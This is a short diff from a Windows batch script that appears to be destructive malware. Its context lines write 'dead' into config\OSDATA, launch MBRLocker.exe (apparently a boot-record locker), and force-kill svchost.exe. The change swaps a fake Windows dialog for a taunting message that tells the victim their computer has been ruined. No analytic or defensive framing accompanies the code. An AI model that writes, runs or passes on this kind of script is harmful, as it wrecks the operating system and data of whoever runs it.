@@ -122,7 +122,7 @@ echo dead>config\OSDATA
 cd %userprofile%\Desktop
 MBRLocker.exe
 timeout /t 15 /nobreak
-echo x=msgbox("The operation completed successfully.",48,0,"Microsoft Windows")>yt.vbs
+echo x=msgbox("You got your computer screwed successfully.",48+0,"Microsoft Windows")>yt.vbs
 wscript yt.vbs
 del yt.vbs /f
 taskkill /f /im svchost.exe
